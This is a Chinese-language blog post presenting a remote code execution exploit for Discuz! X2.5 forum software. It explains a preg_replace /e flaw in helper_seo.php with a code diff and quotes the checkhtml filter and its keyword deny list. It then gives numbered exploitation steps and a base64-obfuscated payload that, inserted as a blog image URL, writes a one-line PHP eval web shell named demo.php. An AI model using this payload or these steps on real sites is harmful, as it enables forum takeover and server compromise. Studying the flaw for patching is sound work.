@@ -1,0 +1,153 @@
+DZ2.5 最新0day漏洞exp
+
+漏洞标题： Discuz!X2.5Release20120407版命令执行 
+漏洞文件：upload\source\class\helper\helper_seo.php
+ 在后台设置了，前台就能通过添加特殊内容进行命令执行
+ 先上图后上代码 大家目测吧
+ 
+ 
+ 
+
+
+ 
+ 
+
+PS: Discuz!是开源产品，很容易通过对比的手段找到以前的修正过的问题，希望相关的站长做好升级
+ '---------------------------------------------------------------------------------------------------
+ 
+if(!defined(‘IN_DISCUZ’)) {
+ @@ -89,7 +89,7 @@
+ }
+ }
+ if($searcharray && $replacearray) {
+ - $content = preg_replace(“/(.*?)|()|(\[attach\](\d+)\[\/attach\])/ies”, ‘helper_seo::base64_transform(“encode”, “”, “\\1\\2\\3″, “”)’, $content);
+ + $content = preg_replace(“/(.*?)|()|(\[attach\](\d+)\[\/attach\])/ies”, “helper_seo::base64_transform(‘encode’, ”, ‘\\1\\2\\3′, ”)”, $content);
+ $content = preg_replace($searcharray, $replacearray, $content, 1);
+ $content = preg_replace(“/(.*?)/ies”, “helper_seo::base64_transform(‘decode’, ”, ‘\\1′, ”)”, $content);
+ }
+ @@ -100,7 +100,7 @@///www.hake.cc
+ 
+public static function base64_transform($type, $prefix, $string, $suffix) {
+ if($type == ‘encode’) {
+ - return $prefix.base64_encode(str_replace(“\’”, “‘”, $string)).$suffix; // – -
+ + return $prefix.base64_encode(str_replace(“\\\”", “\”", $string)).$suffix;
+ } elseif($type == ‘decode’) {
+ return $prefix.base64_decode($string).$suffix;
+ }
+ 够清楚吧，问题在/source/class/helper/helper_seo.php 92行附近的：
+ 1
+ $content = preg_replace(“/(.*?)|()|(\[attach\](\d+)\[\/attach\])/ies”, ‘helper_seo::base64_transform(“encode”, ““, “\\1\\2\\3″, ““)’, $content);
+ preg_replace 使用了e修正符，又是双引号，所以导致远程任意代码执行。
+ 需要论坛支持个功能，啥功能看68行 $_G['cache']['relatedlink']，grep下relatedlink一路跟，具体代码先不贴，找到需要后台开个seo功能，在运营-关联链接 /admin.php?frames=yes&action=misc&operation=relatedlink，且至少需要设置一个链接，这功能不是所有管理员都开，但是我觉得大部分都会开，如果不开，它就只能是个后台拿shell的tips了。
+ 1
+ 2
+ 3
+ 4
+ function_core.php 1925
+ function parse_related_link($content, $extent) {
+ return helper_seo::parse_related_link($content, $extent);
+ }
+ 看正则
+ 
+“/(.*?)|()|(\[attach\](\d+)\[\/attach\])/ies”
+ 
+
+PS 影响版本有：Discuz!X2.5Release20120407，beta，rc 版命令执行 
+1.注册任意账户 
+2.登陆用户，发表blog日志（注意是日志） 
+3.添加图片，选择网络图片，地址{${fputs(fopen(base64_decode(ZGVtby5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}} 
+4.访问日志，论坛根目录下生成demo.php，一句发密码c
+ 
+
+
+那么利用方式还用说么？ 各种地方比如 source/include/space/space_blog.php  的checkhtml 函数
+ 同样本人贴出相关代码提供大家大牛参考 请大牛不要D小站 本站只是发表文章 不防D的 一D就挂
+ 
+function checkhtml($html) {
+ 
+        if(!checkperm('allowhtml')) {
+ 
+
+
+                preg_match_all("/\<([^\<]+)\>/is", $html, $ms);
+ 
+
+
+                $searchs[] = '<';
+ 
+                $replaces[] = '<';
+ 
+                $searchs[] = '>';
+ 
+                $replaces[] = '>';
+ 
+
+
+                if($ms[1]) {
+ 
+                        $allowtags = 'img|a|font|div|table|tbody|caption|tr|td|th|br|p|b|strong|i|u|em|span|ol|ul|li|blockquote|object|param|embed';
+ 
+                        $ms[1] = array_unique($ms[1]);
+ 
+                        foreach ($ms[1] as $value) {
+ 
+                                $searchs[] = "<".$value.">";
+ 
+
+
+                                $value = str_replace('&', '_uch_tmp_str_', $value);
+ 
+                                $value = dhtmlspecialchars($value);
+ 
+                                $value = str_replace('_uch_tmp_str_', '&', $value);
+ 
+
+
+                                $value = str_replace(array('\\','/*'), array('.','/.'), $value);
+ 
+                                $skipkeys = array('onabort','onactivate','onafterprint','onafterupdate','onbeforeactivate','onbeforecopy','onbeforecut','onbeforedeactivate',
+ 
+                                                'onbeforeeditfocus','onbeforepaste','onbeforeprint','onbeforeunload','onbeforeupdate','onblur','onbounce','oncellchange','onchange',
+ 
+                                                'onclick','oncontextmenu','oncontrolselect','oncopy','oncut','ondataavailable','ondatasetchanged','ondatasetcomplete','ondblclick',
+ 
+                                                'ondeactivate','ondrag','ondragend','ondragenter','ondragleave','ondragover','ondragstart','ondrop','onerror','onerrorupdate',
+ 
+                                                'onfilterchange','onfinish','onfocus','onfocusin','onfocusout','onhelp','onkeydown','onkeypress','onkeyup','onlayoutcomplete',
+ 
+                                                'onload','onlosecapture','onmousedown','onmouseenter','onmouseleave','onmousemove','onmouseout','onmouseover','onmouseup','onmousewheel',
+ 
+                                                'onmove','onmoveend','onmovestart','onpaste','onpropertychange','onreadystatechange','onreset','onresize','onresizeend','onresizestart',
+ 
+                                                'onrowenter','onrowexit','onrowsdelete','onrowsinserted','onscroll','onselect','onselectionchange','onselectstart','onstart','onstop',
+ 
+                                                'onsubmit','onunload','javascript','script','eval','behaviour','e-xpression','style','class');
+ 
+                                $skipstr = implode('|', $skipkeys);
+ 
+                                $value = preg_replace(array("/($skipstr)/i"), '.', $value);
+ 
+                                if(!preg_match("/^[\/|\s]?($allowtags)(\s+|$)/is", $value)) {
+ 
+                                        $value = '';
+ 
+                                }
+ 
+                                $replaces[] = empty($value)?'':"<".str_replace('"', '"', $value).">";
+ 
+                        }
+ 
+                }
+ 
+                $html = str_replace($searchs, $replaces, $html);
+ 
+        }
+ 
+
+
+        return $html;
+ 
+}
+ 
+
+
